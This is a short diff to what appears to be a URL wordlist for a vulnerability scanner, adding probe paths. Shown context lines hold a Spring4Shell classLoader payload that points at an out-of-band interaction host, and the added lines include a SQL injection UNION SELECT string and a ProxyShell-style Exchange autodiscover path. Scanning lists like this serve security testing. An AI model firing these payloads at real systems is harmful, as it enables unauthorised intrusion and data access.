@@ -40,3 +40,7 @@
 /?class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
 /admin/airflow/code?root=&dag_id=example_passing_params_via_test_command
 /code?dag_id=example_passing_params_via_test_command
+/secure/WBSGanttManageScheduleJobAction.jspa;
+/ubus/
+/badging/badge_template_print.php?tpl=aa.xml&idt=1337%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
+/autodiscover/autodiscover.json@Powershell.{{randstr}}.com/owa/
